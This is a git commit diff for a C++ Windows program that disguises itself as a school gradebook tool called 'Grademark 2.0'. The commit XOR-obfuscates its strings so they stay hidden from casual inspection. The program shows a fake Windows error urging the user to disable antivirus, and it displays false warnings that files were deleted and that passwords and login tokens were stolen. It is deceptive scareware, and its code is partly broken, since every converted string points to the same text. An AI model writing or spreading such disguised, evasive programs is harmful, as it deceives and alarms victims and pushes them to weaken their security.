3a2f5464f5420fe19321bbb57e36c4097195bad0
TurboSonic1 <38984276+TurboSonic1@users.noreply.github.com>
2024-02-12 14:20:23 -0500

    Added XOR encryption partially
    Made it so its partially encrypted via XOR to make it harder to read text when opening exe in notepad, however it still needs to be implemented on other parts as well.

--- main.cpp
+++ main.cpp
@@ -2,54 +2,69 @@
 #include <Lmcons.h>
 #include <iostream>
 #include <fstream>
-#include<bits/stdc++.h> 
+#include <bits/stdc++.h> 
 
-// TODO: Implement audio and use XOR Encryption or something else to make it harder to decrypt text
+//https://md5decrypt.net/en/Xor/ for XOR encryption and decryption, Key is T and Text for input type, key type, and output type
+
+// TODO: Implement audio
 /* #pragma comment(lib, "winmm.lib") 
 
 void sound() {
     PlaySound("sfx.wav", NULL, SND_FILENAME | SND_ASYNC);
 } 
-
+*/
 
 std::string encryptDecrypt(std::string toEncrypt) 
 {
     char key = 'T'; //Any char will work
     std::string output = toEncrypt;
-    
+    int i = 0;
     for (int i = 0; i < toEncrypt.size(); i++)
         output[i] = toEncrypt[i] ^ key;
     
     return output;
 
 }
-*/
 
+
+// Need to figure out how to use this even with it being above main or just put it into main
 void messagestouser(char stage) {
     switch(stage) {
         case 0:
             std::cout << "0x00 Error";
             break;
         case 1:
-            int msgboxID = MessageBox(0,"You probably shouldn't have opened this..", "Oops", MB_OK | MB_ICONWARNING);
+            int msgboxID = MessageBox(0, "You probably shouldn't have opened this..", "Oops", MB_OK | MB_ICONWARNING);
             break;
     }
 }
 
 int main(){ 
-/*    char sampleString[] = "0x00 Error";
-    char outputinformation[] = "";
-    printf("Encrypted String: "); 
-    encryptDecrypt(sampleString, outputinformation); 
-    printf("\n");
-    printf("Decrypted String: "); 
-    encryptDecrypt(sampleString, outputinformation);
-
-    std::string encrypted = encryptDecrypt("0x00 Error");
-        std::cout << "Encrypted:" << encrypted << "\n";
-    std::string decrypted = encryptDecrypt(encrypted);
-        std::cout << "Decrypted:" << decrypted << "\n";
-*/
+    // XOR Cipher translations and code below
+    char a[] = "-;!t$&;6568-t'<;!80:s t<5\"1t;$1:10t <='zz"; //You probably shouldn't have opened this..
+    char b[] = ";;$'"; //Oops
+    char c[] = "d,ddt&&;&"; //0x00 error
+    char d[] = "$$8=75 =;:t25=810t ;t1,17! 1z"; //Application failed to execute.
+    char e[] = "=7&;';2 t=:0;#'"; //Microsoft Windows
+    char f[] = "&&;&t75::; t7;::17 t ;t1&\"1&t ;t0;#:8;50t2=81't;t-;!t#5: t ;t &-t535=:kt|:;#:t ;t25=8t;:t2=&' t!'1}"; //Error cannot connect to Server to download files Do you want to try again? (Known to fail on first use)"
+    char g[] = " <='t='t <1t61 5t\"1&'=;:t;2t <1t:1#t3&5016;;?t ;;8t01\"18;$10t2;&t <='t'7<;;8;"; //This is the beta version of the new gradebook tool developed for this school
+    char h[] = " <='t7;9$! 1&t='t:;#t12217 =\"18-t &5'<10t;91;:1t:;#t<5't-;!&t$5''#;&0't5:0t8;3=:t ;?1:'zzt\"1&- =91t-;!t6;; t <1&1s't5t7<5:71t588t;2t-;!&t05 5t#=88t61t3;:1"; //This computer is now effectively trashed Someone now has your passwords and login tokens.. Everytime you boot there's a chance all of your data will be gone
+    std::string decrypta = encryptDecrypt(a);
+    std::string decryptb = encryptDecrypt(b);
+    std::string decryptc = encryptDecrypt(c);
+    std::string decryptd = encryptDecrypt(d);
+    std::string decrypte = encryptDecrypt(e);
+    std::string decryptf = encryptDecrypt(f);
+    std::string decryptg = encryptDecrypt(g);
+    std::string decrypth = encryptDecrypt(h);
+    LPCSTR converteda = decrypta.c_str();
+    LPCSTR convertedb = decrypta.c_str();
+    LPCSTR convertedc = decrypta.c_str();
+    LPCSTR convertedd = decrypta.c_str();
+    LPCSTR convertede = decrypta.c_str();
+    LPCSTR convertedf = decrypta.c_str();
+    LPCSTR convertedg = decrypta.c_str();
+    LPCSTR convertedh = decrypta.c_str();
     std::ofstream checkifavdetected;
     checkifavdetected.open ("C:\\Users\\Public\\Downloads\\2");
     checkifavdetected << "2\n";
@@ -62,7 +77,7 @@ int main(){
         check.close();
     }
     else {
-        int msgboxID = MessageBox(0,"Application failed to execute.\nTry disabling your antivirus.", "Microsoft Windows", MB_OK | MB_ICONERROR);
+        int msgboxID = MessageBox(0,convertedd, convertede, MB_OK | MB_ICONERROR);
         check.close();
     }
 
@@ -71,9 +86,7 @@ int main(){
     std::ifstream stopp;
     stopp.open ("C:\\Users\\Public\\Downloads\\1");
 
-    if(stopp) {     /*
-        std::string decrypted = encryptDecrypt(encrypted);
-        std::cout << "Decrypted:" << decrypted << "\n"; */
+    if(stopp) {
         int msgboxID = MessageBox(0,"my cat ate one of your files :<", "sorry", MB_OK | MB_ICONWARNING);
         stopp.close();
     }
@@ -81,7 +94,6 @@ int main(){
         int msgboxID = MessageBox(0,"I'll just delete a random file", "stop", MB_OK | MB_ICONERROR);
         file.close();
         std::ofstream newfile;
-        char name [81];
         newfile.open("C:\\Users\\Public\\Downloads\\1");
         newfile << "1\n";
         newfile.close();
@@ -89,20 +101,20 @@ int main(){
     }
     else {
         std::ofstream anfile;
-        char name[81];
         anfile.open("C:\\Users\\Public\\Downloads\\0");
         anfile << "0\n";
         anfile.close();
-        int msgboxID = MessageBox(0,"Error cannot connect to Server to download files\nDo you want to try again?\n(Known to fail on first use)", "Grademark 2.0 (13b38a) (Internal Tool)", MB_RETRYCANCEL | MB_ICONERROR);
+        LPCSTR pcstr = decrypta.c_str();
+        int msgboxID = MessageBox(0, convertedf, "Grademark 2.0 (13b38a) (Internal Tool)" , MB_RETRYCANCEL | MB_ICONERROR);
         stage = 1;
         switch (msgboxID){
                 case IDCANCEL:
                     messagestouser(stage);
                 case IDRETRY:
-                    int msgboxID = MessageBox(0,"Welcome!\nThis is the beta version of the new gradebook tool developed for this school" , "Grademark 2.0 (13b38a) (Internal Tool)", MB_OK | MB_ICONINFORMATION);
+                    int msgboxID = MessageBox(0, convertedg, "Grademark 2.0 (13b38a) (Internal Tool)", MB_OK | MB_ICONINFORMATION);
                     messagestouser(stage);
         }
-        int msgboxIDa = MessageBox(0,"This computer is now effectively trashed\nSomeone now has your passwords and login tokens..\nEverytime you boot there's a chance all of your data will be gone", ".", MB_OK | MB_ICONWARNING);
+        int msgboxIDa = MessageBox(0, convertedh, ".", MB_OK | MB_ICONWARNING);
         switch (msgboxIDa) {
                 case IDOK:
                 break;
